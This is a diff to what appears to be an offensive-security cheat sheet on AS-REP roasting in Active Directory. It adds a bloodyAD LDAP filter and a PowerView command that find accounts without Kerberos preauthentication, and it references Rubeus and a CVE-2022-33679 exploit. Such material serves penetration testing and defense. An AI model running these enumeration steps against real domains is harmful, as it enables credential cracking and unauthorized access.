@@ -3,7 +3,15 @@
 > If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
 
 **Requirements**:
-- Accounts with the attribute **DONT_REQ_PREAUTH** (`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`)
+* Accounts with the attribute **DONT_REQ_PREAUTH**
+  * Windows/Linux:
+    ```ps1
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+    ```
+  * Windows only:
+    ```ps1
+    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+    ```
 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
   ```powershell
@@ -82,7 +90,15 @@ The technique is fully explained in this article: [Semperis blog post](https://w
 Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
 
 **Requirements**:
-- Accounts with the attribute **DONT_REQ_PREAUTH** (`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`)
+* Accounts with the attribute **DONT_REQ_PREAUTH**
+  * Windows/Linux:
+    ```ps1
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+    ```
+  * Windows only:
+    ```ps1
+    PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+    ```
 
 * using [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)
   ```bash
